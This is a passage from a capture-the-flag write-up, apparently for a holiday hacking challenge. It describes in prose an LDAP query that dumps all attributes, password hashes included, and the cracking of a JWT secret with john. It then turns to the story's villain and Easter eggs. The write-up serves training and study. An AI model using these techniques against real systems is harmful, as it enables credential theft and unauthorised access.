and by passing <code>*</code> as the attributes query field. With that query and all
attributes it is able to grab the entire ldap database including password
hashes.
</p>

<p>
The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
</p>
</div>
</div>

<div id="outline-container-org993e8bc" class="outline-4">
<h4 id="q8_alternatives"><a id="org993e8bc"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q8_alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</div>

<div id="outline-container-org7f0fe94" class="outline-4">
<h4 id="q8_common-pitfalls"><a id="org7f0fe94"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q8_common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>

<p>
Cracking the JWT key was tricky without the propper tools.
My first python based solution was broken.  A fixed version was too slow.
running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
<a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a> was a bit faster, but john outperformed
everything.  The hard part was finding out how to use john to crack a jwt secret key.
</p>
</div>
</div>

<div id="outline-container-org284d278" class="outline-4">
<h4 id="q8_about-the-challenge"><a id="org284d278"></a>About the Challenge</h4>
<div class="outline-text-4" id="text-q8_about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</div>
</div>
<div id="outline-container-orgd5a4dae" class="outline-3">
<h3 id="orgd5a4dae">Fin: The Evil Good Witch</h3>
<div class="outline-text-3" id="text-orgd5a4dae">
</div>
<div id="outline-container-orgfa83334" class="outline-4">
<h4 id="q9_question"><a id="orgfa83334"></a>Question</h4>
<div class="outline-text-4" id="text-q9_question">
<p>
Which character is ultimately the villain causing the giant snowball
problem. What is the villain's motive?
</p>
</div>
</div>

<div id="outline-container-org204bce4" class="outline-4">
<h4 id="q9_solution"><a id="org204bce4"></a>Solution</h4>
<div class="outline-text-4" id="text-q9_solution">
<p>
This answer comes straight from the game. Once we've found at least 5 pages, and completed all the levels, we see the following message:
</p>


<div class="figure">
<p><img src="./images/glinda.png" alt="glinda.png" />
</p>
<p><span class="figure-number">Figure 24: </span>The Villain Revealed</p>
</div>

<p>
It's always about the money&#x2026;
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orge4e5f3f" class="outline-2">
<h2 id="orge4e5f3f">Easter Eggs</h2>
<div class="outline-text-2" id="text-orge4e5f3f">
</div>
<div id="outline-container-org5ade6b7" class="outline-3">
<h3 id="org5ade6b7">Story Page</h3>
<div class="outline-text-3" id="text-org5ade6b7">
</div>
<div id="outline-container-orgeeac070" class="outline-4">
<h4 id="orgeeac070">Wintered logo is based on the Wicked stage musical poster.</h4>
</div>
<div id="outline-container-org9079d81" class="outline-4">
<h4 id="org9079d81">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h4>
<div class="outline-text-4" id="text-org9079d81">
<iframe width="560" height="315" src="https://www.youtube.com/embed/g9ByiEGfAXk?rel=0&amp;start=99" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
</div>
</div>
</div>

<div id="outline-container-org8480a98" class="outline-3">
<h3 id="org8480a98">North Pole and Beyond</h3>
<div class="outline-text-3" id="text-org8480a98">
</div>
<div id="outline-container-org762c254" class="outline-4">
<h4 id="org762c254">Stocking</h4>
<div class="outline-text-4" id="text-org762c254">
<p>
The text field for entering the SHA1 hashes of the great book pages appears to have some placeholder text in it, <code>686579212121202d436f756e746572204861636b</code>. This is in hex and can be converted to ascii, <code>hey!!! -Counter Hack</code>.
</p>
</div>
</div>

<div id="outline-container-org693a1e9" class="outline-4">
<h4 id="org693a1e9">Exploration</h4>
<div class="outline-text-4" id="text-org693a1e9">
</div>
<ul class="org-ul">
<li><a id="orgf88b8e3"></a>Star Wars robots references in <a href="http://nppd.northpolechristmastown.com/robots.txt">http://nppd.northpolechristmastown.com/robots.txt</a><br />
<div class="outline-text-5" id="text-orgf88b8e3">
<p>
The robots.txt page for the nppd site has a number of robot references as user-agents.
</p>
<ul class="org-ul">
<li>hk-47, a hunter-killer assassin droid</li>
<li>threepio, an obvious reference to C3PO. There's a sand-crawler-delay variable set to '421' which could be a reference to the storm trooper, TK-421, who was abushed on the Millenium Falcon, and incidentally is also the only named Storm Trooper in the original trilogy.</li>
<li>artoo, an obvious reference to R2D2. There's a sand-craler-delay variable set to '2187' which is likely a reference to the cell that Princess Leia was in on the Death Star.</li>
</ul>
</div>
</li>

<li><a id="orgba589b4"></a>Munchkins<br />
<div class="outline-text-5" id="text-orgba589b4">
<p>
In the Munchin BOLO, the munchkins disappeared after speaking something that sounded like 'puuurzgexgull'. This is most likely a reference to the word 'pyrzqxgl' which was a word described in the book 'The Magic of Oz'. A munchkin, incidentally named 'Bini Aru', like the munchkin in the BOLO, wrote down how to pronounce the word. The word was magical and could be used to transform a being into a different creature. Also, Boq is another munchkin named in the Land of Oz book series.
</p>
</div>
</li>
</ul>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: NCSA Security Team</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
